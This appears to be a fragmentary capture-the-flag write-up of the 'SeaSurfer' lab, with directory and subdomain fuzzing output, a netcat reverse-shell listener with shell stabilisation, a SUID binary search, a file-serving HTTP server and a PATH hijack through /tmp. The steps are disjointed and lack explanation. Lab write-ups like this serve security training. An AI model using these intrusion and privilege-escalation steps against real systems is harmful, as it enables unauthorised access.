[23:15:25] 301 -    0B  - /adminer/phpmyadmin2/index.php  ->  http://seasurfer.thm/adminer/phpmyadmin2/
[23:15:25] 301 -    0B  - /adminer/phpmyadmin1/index.php  ->  http://seasurfer.thm/adminer/phpmyadmin1/
[23:15:25] 301 -    0B  - /adminer/phpMyadmin_bak/index.php  ->  http://seasurfer.thm/adminer/phpMyadmin_bak/
[23:15:25] 301 -    0B  - /adminer/phpMyAdminold/index.php  ->  http://seasurfer.thm/adminer/phpMyAdminold/
[23:15:33] 301 -    0B  - /adminer/PMA/index.php  ->  http://seasurfer.thm/adminer/PMA/
[23:15:33] 301 -    0B  - /adminer/pma-old/index.php  ->  http://seasurfer.thm/adminer/pma-old/
[23:15:33] 301 -    0B  - /adminer/pma/index.php  ->  http://seasurfer.thm/adminer/pma/
[23:15:33] 301 -    0B  - /adminer/PMA2/index.php  ->  http://seasurfer.thm/adminer/PMA2/
[23:15:35] 301 -    0B  - /adminer/pmamy/index.php  ->  http://seasurfer.thm/adminer/pmamy/
[23:15:35] 301 -    0B  - /adminer/pmamy2/index.php  ->  http://seasurfer.thm/adminer/pmamy2/
[23:15:36] 301 -    0B  - /adminer/pmd/index.php  ->  http://seasurfer.thm/adminer/pmd/
[23:16:03] 301 -    0B  - /adminer/rating_over.  ->  http://seasurfer.thm/adminer/rating_over
[23:16:23] 301 -    0B  - /adminer/roundcube/index.php  ->  http://seasurfer.thm/adminer/roundcube/
[23:16:24] 301 -    0B  - /adminer/rss  ->  http://seasurfer.thm/adminer/feed/
[23:16:28] 301 -    0B  - /adminer/s  ->  http://seasurfer.thm/sale/
[23:16:28] 301 -    0B  - /adminer/sample  ->  http://seasurfer.thm/sample-page/
```

<h2 align="center">Internal Web Application</h2>

```bash
:~/SeaSurfer# wfuzz -u http://seasurfer.thm -H 'Host: FUZZ.seasurfer.thm' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -c --hc 302 --hw 964
...
000000387:   200        108 L    275 W    3072 Ch     "internal"
```

<h2 align="center">Host Resolution</h2>

```bash
xx.xxx.xx.xxx seasurfer.thm internal.seasurfer.thm
```



root@ip-10-201-116-114:~/SeaSurfer# stty raw -echo; fg
nc -nlvp 6666

kyle@ip-10-201-49-136:/var/www/internal/invoices$ export TERM=xterm
kyle@ip-10-201-49-136:/var/www/internal/invoices$ 
kyle@ip-10-201-49-136:/var/www/internal/invoices$ ps aux | grep root
Error, do this: mount -t proc proc /proc
kyle@ip-10-201-49-136:/var/www/internal/invoices$ cd /home/kyle
kyle@ip-10-201-49-136:~$ find / -perm -4000 -ls 2>/dev/null
     1383     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
    13750     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     5878    156 -rwsr-xr-x   1 root     root         159304 Jan 15  2025 /usr/lib/snapd/snap-confine
    15742     24 -rwsr-xr-x   1 root     root          22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
     8703    468 -rwsr-xr-x   1 root     root         477672 Apr 11 12:16 /usr/lib/openssh/ssh-keysign
     8203     56 -rwsr-xr-x   1 root     root          55528 Apr  9  2024 /usr/bin/mount
    12054     84 -rwsr-xr-x   1 root     root          85064 Feb  6  2024 /usr/bin/chfn
     5604    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo
    12057     88 -rwsr-xr-x   1 root     root          88464 Feb  6  2024 /usr/bin/gpasswd
    12078     68 -rwsr-xr-x   1 root     root          68208 Feb  6  2024 /usr/bin/passwd
     8579     40 -rwsr-xr-x   1 root     root          39144 Apr  9  2024 /usr/bin/umount
      672     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount
    13995     68 -rwsr-xr-x   1 root     root          67816 Apr  9  2024 /usr/bin/su
    10627     44 -rwsr-xr-x   1 root     root          44784 Feb  6  2024 /usr/bin/newgrp
    15740     32 -rwsr-xr-x   1 root     root          31032 Feb 21  2022 /usr/bin/pkexec
        491     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at
    12055     52 -rwsr-xr-x   1 root     root          53040 Feb  6  2024 /usr/bin/chsh
      210    177 -rwsr-xr-x   1 root     root         180752 Jan 17  2025 /snap/snapd/23771/usr/lib/snapd/snap-confine
      210    177 -rwsr-xr-x   1 root     root         180753 Apr  5 19:10 /snap/snapd/24505/usr/lib/snapd/snap-confine
      875     84 -rwsr-xr-x   1 root     root          85064 Feb  6  2024 /snap/core20/2571/usr/bin/chfn
      881     52 -rwsr-xr-x   1 root     root          53040 Feb  6  2024 /snap/core20/2571/usr/bin/chsh
      951     87 -rwsr-xr-x   1 root     root          88464 Feb  6  2024 /snap/core20/2571/usr/bin/gpasswd
     1035     55 -rwsr-xr-x   1 root     root          55528 Apr  9  2024 /snap/core20/2571/usr/bin/mount
     1044     44 -rwsr-xr-x   1 root     root          44784 Feb  6  2024 /snap/core20/2571/usr/bin/newgrp
     1059     67 -rwsr-xr-x   1 root     root          68208 Feb  6  2024 /snap/core20/2571/usr/bin/passwd
     1169     67 -rwsr-xr-x   1 root     root          67816 Apr  9  2024 /snap/core20/2571/usr/bin/su
     1170    163 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /snap/core20/2571/usr/bin/sudo
     1228     39 -rwsr-xr-x   1 root     root          39144 Apr  9  2024 /snap/core20/2571/usr/bin/umount
     1317     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/2571/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1691    467 -rwsr-xr-x   1 root     root              477672 Feb 11  2025 /snap/core20/2571/usr/lib/openssh/ssh-keysign
      812     84 -rwsr-xr-x   1 root     root               85064 Mar 14  2022 /snap/core20/1518/usr/bin/chfn
      818     52 -rwsr-xr-x   1 root     root               53040 Mar 14  2022 /snap/core20/1518/usr/bin/chsh
      887     87 -rwsr-xr-x   1 root     root               88464 Mar 14  2022 /snap/core20/1518/usr/bin/gpasswd
      971     55 -rwsr-xr-x   1 root     root               55528 Feb  7  2022 /snap/core20/1518/usr/bin/mount
      980     44 -rwsr-xr-x   1 root     root               44784 Mar 14  2022 /snap/core20/1518/usr/bin/newgrp
      993     67 -rwsr-xr-x   1 root     root               68208 Mar 14  2022 /snap/core20/1518/usr/bin/passwd
     1102     67 -rwsr-xr-x   1 root     root               67816 Feb  7  2022 /snap/core20/1518/usr/bin/su
     1103    163 -rwsr-xr-x   1 root     root              166056 Jan 19  2021 /snap/core20/1518/usr/bin/sudo
     1161     39 -rwsr-xr-x   1 root     root               39144 Feb  7  2022 /snap/core20/1518/usr/bin/umount
     1248     51 -rwsr-xr--   1 root     systemd-resolve    51344 Apr 29  2022 /snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1620    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1518/usr/lib/openssh/ssh-keysign




:~/SeaSurfer# ssh-keygen


~/SeaSurfer# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;













<h2 align="center">http://seasurfer.thm/adminer/?server=localhost&username=wordpressuser&db=wordpress&select=wp_comments</h2>
<p>

- dude what was the site again where u could create receipts for customers? the computer is saying cant connect to intrenal.seasurfer.thm
- 192.168.1.139
- brandon@seasurfer.thm
</p>

<img width="1686" height="484" alt="image" src="https://github.com/user-attachments/assets/1f16455c-d6c5-44cd-a01d-1d55951db49a" />








